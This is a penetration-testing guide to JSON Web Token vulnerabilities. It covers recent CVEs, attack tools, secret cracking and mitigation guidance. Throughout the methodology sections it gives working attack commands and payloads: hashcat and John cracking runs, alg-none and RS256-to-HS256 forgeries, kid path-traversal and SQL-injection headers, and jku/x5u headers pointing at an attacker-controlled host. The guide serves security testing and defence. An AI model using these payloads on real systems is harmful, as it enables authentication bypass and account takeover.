# JWT

JSON Web Tokens (JWTs) are a common attack vector in web application security assessments. This guide provides a structured approach to identifying, exploiting, and mitigating JWT vulnerabilities based on real-world CVEs and practical penetration testing methodologies.
https://jwtauditor.com/

---

## Overview

A JWT consists of three Base64Url-encoded parts separated by dots: **Header**, **Payload**, and **Signature**. The security of a JWT implementation depends entirely on proper cryptographic validation. When this validation is flawed, attackers can bypass authentication entirely.

### Critical Real-World Vulnerabilities (2025-2026)

The following recently discovered vulnerabilities demonstrate that JWT attacks remain highly relevant:

**CVE-2026-29000 - pac4j-jwt Authentication Bypass (CVSS 10.0)**
This critical vulnerability affects pac4j-jwt versions 6.0.3 and below. When applications use JWE (encrypted JWT) with inner JWS signature verification, the library fails to properly handle unsigned PlainJWT with `alg: "none"` inside the JWE envelope. An attacker can forge valid admin tokens using only the public key from the `/jwks` endpoint, enabling complete authentication bypass and user impersonation.

**CVE-2026-22817 - Hono JWT Algorithm Confusion**
Prior to version 4.11.4, Hono's JWT verification middleware allowed the JWT header's `alg` value to influence signature verification when the selected JWK did not explicitly specify an algorithm. This flaw enables algorithm confusion attacks, allowing attackers to forge tokens that the verifier accepts. The vulnerability is automatable and requires no user interaction.

**CVE-2025-68620 - Signal K Server JWT Token Theft (CVSS 9.1)**
Versions prior to 2.19.0 expose two chainable vulnerabilities: unauthenticated WebSocket request enumeration and unauthenticated polling of access request status. Attackers can monitor WebSocket streams to discover request IDs, then poll those IDs to receive issued JWT tokens in plaintext when administrators approve requests. This requires zero authentication and enables complete authentication bypass.

---

## Tools

### Primary Testing Tools

```bash
# https://github.com/ticarpi/jwt_tool
# Comprehensive toolkit for JWT validation testing
# https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology

# https://github.com/hahwul/jwt-hack
# Lightweight CLI tool for JWT manipulation

# https://github.com/mazen160/jwt-pwn
# Focused on JWT attack automation

# https://github.com/mBouamama/MyJWT
# JWT attack proof-of-concept toolkit

# https://github.com/DontPanicO/jwtXploiter
# Advanced JWT exploitation framework

# Test all common attacks against a target endpoint
python3 jwt_tool.py -t https://url_that_needs_jwt/ -rh "Authorization: Bearer JWT" -M at -cv "Welcome user!"
```

### Burp Suite JWT Editor Extension

The JWT Editor extension for Burp Suite provides comprehensive JWT testing capabilities including:
- JWT signing and verification using stored keys
- Built-in attacks: 'none' algorithm, HMAC key confusion, embedded JWK, psychic signature (CVE-2022-21449)
- Collaborator payload injection via x5u or jku headers
- Brute-forcing weak HMAC secrets

### Cracking Tools

```bash
# Hashcat - JWT HMAC cracking
# Mode 16500 = JWT (JSON Web Token)
# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt passlist.txt

# Rule-based attack with best64 rules
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule

# Brute-force attack with incrementing length
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6

# Brute-force all ASCII characters length 1-8
hashcat -a 3 -m 16500 --increment token.txt ?a?a?a?a?a?a?a?a

# John the Ripper with jwt2john
pip install PyJWT
# https://github.com/Sjord/jwtcrack
# https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py
jwt2john.py JWT > /tmp/token.hash
john /tmp/token.hash --wordlist=wordlist.txt

# Token Reverser - Wordlist generator for token cracking
# https://github.com/dariusztytko/token-reverser
```

### JWT Generation from Command Line

```bash
pip install pyjwt

# Generate a basic admin token
python3 -c 'import jwt; print(jwt.encode({"role": "admin"}, "SECRET", algorithm="HS256").decode("UTF-8"))'

# Generate token with custom claims and expiration
python3 -c 'import jwt, time; print(jwt.encode({"user": "admin", "exp": int(time.time()) + 3600}, "SECRET", algorithm="HS256"))'
```

---

## General Information & Attack Surface

```
1. Leak Sensitive Information from decoded tokens
2. Test tokens without signature validation
3. Change algorithm from RS256 to HS256
4. Crack weak HMAC secrets
5. Kid header manipulation (path traversal, SQL injection)
6. JKU/X5U header injection with open redirect
7. JWKS endpoint enumeration
8. Timing attack vectors on signature verification

Example JWT for testing:
eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1ODQ2NTk0MDAsInVzZXJuYW1lIjoidGVtcHVzZXI2OSIsInJvbGVzIjpbIlJPTEVfRVhURVJOQUxfVVNFUiJdLCJhcHBDb2RlIjoiQU5UQVJJX0FQSSIsImlhdCI6MTU4NDU3MzAwMH0.AOHXCcMFqYFeDSYCEjeugT26RaZLzPldqNAQSlPNpKc2JvdTG9dr2ini4Z42dd5xTBab-PYBvlXIJetWXOX80A

References:
https://trustfoundry.net/jwt-hacking-101/
https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9
https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/
https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a

Important Testing Notes:
- Always test JWT validation after session termination
- Check for differences between expired and invalid token handling
- Test token reuse across different application contexts
```

---

## Attack Methodology

### 1. Information Disclosure

The first step in any JWT assessment is decoding the token to examine its contents. JWTs often contain sensitive information that should not be exposed:

```bash
# Decode JWT without verification (jwt_tool)
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c -d

# Decode using jwt-hack
jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Look for:
- Hardcoded credentials in claims
- Internal system information
- User identifiers that can be modified
- Privilege escalation opportunities via role claims

### 2. None Algorithm Attack

When the server accepts tokens with the `"alg": "none"` header, signature validation is completely bypassed. This vulnerability has been documented in CVE-2015-9235 and remains prevalent in misconfigured systems.

**How it works:** The JWT specification allows the "none" algorithm for situations where the token is intentionally unsigned. Some libraries incorrectly treat this as a valid signature verification option.

**Exploitation with jwt_tool:**
```bash
python3 jwt_tool.py <JWT> -X a
```

**Manual exploitation:**
```json
// Original header
{
  "alg": "RS256",
  "typ": "JWT"
}

// Modified header for none attack
{
  "alg": "none",
  "typ": "JWT"
}
```

The signature portion can be removed or set to an empty string.

**Real-world impact:** CVE-2026-29000 demonstrated that even in 2026, the "none" algorithm vulnerability persists in JWE implementations, allowing attackers to forge admin tokens using only publicly available information.

### 3. Algorithm Confusion (RS256 to HS256)

This attack exploits libraries that treat RSA and HMAC signatures interchangeably. When an application expects RS256 (asymmetric) but the attacker changes the algorithm to HS256 (symmetric), the library may attempt to verify the signature using the RSA public key as an HMAC secret.

**Why it works:** The cryptographic primitives are fundamentally different, but vulnerable libraries don't enforce algorithm expectations. If an attacker obtains the public key (often available via `/jwks` or X.509 certificates), they can sign arbitrary tokens.

**Exploitation with jwt_tool:**
```bash
python3 jwt_tool.py <JWT> -S hs256 -k public.pem
```

**Real-world exploitation steps:**
```bash
# 1. Extract public key from the server
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem

# 2. Convert public key to hex format for HMAC signing
cat public.pem | xxd -p | tr -d "\n" > hex.txt

# 3. Create forged token using public key as HMAC secret
python3 -c 'import jwt; print(jwt.encode({"user":"admin","role":"admin"}, open("public.pem").read(), algorithm="HS256"))'
```

**Recent vulnerability:** CVE-2023-48223 affected the fast-jwt library, where improper PEM format matching allowed algorithm confusion attacks when applications used RS256 with `BEGIN RSA PUBLIC KEY` headers.

### 4. Kid Header Path Traversal

The `kid` (Key ID) header parameter tells the server which key to use for verification. When servers use this value to construct file paths for key retrieval without proper sanitization, path traversal becomes possible.

**Classic exploitation (PortSwigger lab):**
```json
// JWT Header
{
  "alg": "HS256",
  "kid": "../../../../../../../dev/null"
}

// JWT Payload  
{
  "sub": "administrator"
}

// Signing key (Base64 null byte)
AA==
```

**Why this works:** The server attempts to read the key file from `../../../../../../../dev/null`, which returns an empty file. The attacker signs the token with a null byte key (`AA==` in Base64), and the server accepts the empty file as a valid key.

**Exploitation with jwt_tool:**
```bash
# Null byte key attack
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../dev/null" -S hs256 -p ""

# Use arbitrary file as key source
python3 jwt_tool.py <JWT> -I -hc kid -hv "/path/to/target/file" -S hs256 -p "$(cat /path/to/target/file)"
```

### 5. Kid Header SQL Injection

When servers use the `kid` value in database queries without parameterization, SQL injection can retrieve arbitrary keys.

**Vulnerable query pattern:**
```sql
SELECT key FROM keys WHERE kid = '[user_controlled_kid]'
```

**Attack payload:**
```json
{
  "alg": "HS256", 
  "kid": "1' UNION SELECT 'attackersecret' -- "
}
```

**Resulting query:**
```sql
SELECT key FROM keys WHERE kid = '1' UNION SELECT 'attackersecret' -- '
```

The attacker then signs tokens using `attackersecret` as the HMAC key.

### 6. JKU Header Injection

The `jku` (JWK Set URL) header tells the server where to fetch the JSON Web Key Set containing verification keys. When not validated against a whitelist, attackers can host their own JWKS.

**Attack flow:**
1. Generate an RSA key pair
2. Host a JWKS file containing the public key at an attacker-controlled URL
3. Create a JWT with `"jku": "https://attacker.com/malicious-jwks.json"`
4. Sign the JWT with the corresponding private key
5. The server fetches and trusts the attacker's public key

**Exploitation with jwt_tool:**
```bash
python3 jwt_tool.py <JWT> -X s -ju "https://attacker.com/jwttool_custom_jwks.json"
```

**Mitigation:** The IETF JWT Best Current Practices document (draft-ietf-oauth-rfc8725bis) recommends either disabling `jku` support entirely or implementing strict whitelist validation with complete URL verification including protocol, domain, and path.

### 7. X5U Header Injection

The `x5u` header provides a URL to an X.509 certificate. Similar to JKU injection, attackers can host malicious certificates.

**Exploitation steps:**
```bash
# 1. Generate attacker certificate
openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out attacker.crt -subj "/C=AU/L=Brisbane/O=Attacker/CN=pentester"

# 2. Host the certificate and create a JWT pointing to it
python3 jwt_tool.py <JWT> -S rs256 -pr private.pem -I -hc x5u -hv "https://attacker.com/custom_x5u.json"
```

### 8. Weak Secret Cracking

When applications use HS256 (symmetric) with low-entropy secrets, offline cracking is possible.

**Cracking methodology:**
```bash
# Extract JWT hash for cracking
jwt2john.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.MewgH9O7tgCClP3pAqOZF3jP5HhCWQhGJgP0nQvXqA8" > hash.txt

# Dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hashcat dictionary attack
hashcat -m 16500 -a 0 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# Hashcat brute force (all printable ASCII, length 1-8)
hashcat -m 16500 -a 3 --increment jwt_hash.txt ?a?a?a?a?a?a?a?a
```

**Performance considerations:** For HS256, Hashcat uses optimized kernels (`-O` flag) supporting password lengths up to 55 characters. Without a mask specified, Hashcat uses default masks (`?1?2`, `?1?2?2?2?2?2`) with charsets `-1 ?l?d?u` and `-2 ?l?d`. For comprehensive testing, specify custom masks based on known secret patterns.

### 9. Payload Manipulation

Beyond cryptographic attacks, modifying payload claims can lead to privilege escalation.

**Common payload modifications:**
```json
{
  "user": "standard_user",
  "role": "user",
  "exp": 1600000000,
  "iat": 1600000000
}

// Modified for escalation
{
  "user": "administrator",
  "role": "admin",
  "exp": 9999999999,
  "iat": 1600000000
}
```

**Testing with jwt_tool:**
```bash
# Modify claims without signature verification check
python3 jwt_tool.py <JWT> -I -pc username -pv admin

# SQL injection in payload fields
python3 jwt_tool.py <JWT> -I -pc name -pv "imparable' ORDER BY 1--" -S hs256 -k public.pem
```

### 10. JWT Format Confusion

Some JWS implementations support both Compact Serialization (standard JWT format) and JSON Serialization. If an application verifies using JSON Serialization but extracts claims using Compact Serialization parsing (string splitting), attackers can forge valid JSON JWS with manipulated payloads.

---

## Vulnerability Classes Summary

| Attack Vector | CVE Examples | Impact |
|---------------|--------------|--------|
| None Algorithm | CVE-2015-9235, CVE-2026-29000 | Authentication bypass |
| Algorithm Confusion | CVE-2015-9235, CVE-2023-48223, CVE-2026-22817 | Token forgery |
| Kid Path Traversal | Lab exercises only | Complete auth bypass |
| Kid SQL Injection | Various | Secret extraction |
| JKU/X5U Injection | Various | Remote key injection |
| Weak HMAC Secrets | Various | Credential cracking |
| Information Disclosure | CVE-2025-68620 | Token theft |
| Format Confusion | Not yet assigned | Authentication bypass |

---

## Prevention Guidelines (Based on IETF BCP)

According to the JSON Web Token Best Current Practices (draft-ietf-oauth-rfc8725bis), the following mitigations are essential:

1. **Explicit algorithm specification:** Never derive algorithms from untrusted JWT headers. Specify expected algorithms in application configuration.

2. **Reject "none" algorithm:** Configure JWT libraries to reject tokens with `alg: "none"` explicitly.

3. **Strict algorithm mapping:** When using asymmetric algorithms, validate that the algorithm in the header matches the expected algorithm type.

4. **Whitelist JKU/X5U URLs:** Maintain strict allowlists for key retrieval URLs, including full path validation.

5. **Sanitize kid values:** Never use unsanitized `kid` values in file paths or database queries.

6. **Use strong secrets:** For HS256, use cryptographically random secrets with sufficient entropy (minimum 256 bits).

7. **Validate JWK parameters:** When using embedded JWK, verify all cryptographic parameters before use.

8. **Implement expiration validation:** Always validate `exp`, `nbf`, and `iat` claims with acceptable leeway.

9. **Use audience restriction:** Validate `aud` claim to prevent token reuse across different applications.

10. **Implement key rotation:** Regularly rotate signing keys and maintain key versioning.

---

## Testing Checklist

- [ ] Decode JWT and audit claims for sensitive information
- [ ] Test `alg: none` attack
- [ ] Test RS256 to HS256 algorithm confusion
- [ ] Attempt to crack HS256 secret with wordlist
- [ ] Test kid header path traversal
- [ ] Test kid header SQL injection
- [ ] Test jku header with attacker-controlled JWKS
- [ ] Test x5u header with attacker-controlled certificate
- [ ] Modify payload claims (user, role, exp, iat)
- [ ] Test token acceptance after session logout
- [ ] Test token replay across different endpoints
- [ ] Enumerate JWKS endpoint if exposed
- [ ] Test for JWE parsing vulnerabilities
- [ ] Verify proper handling of malformed tokens
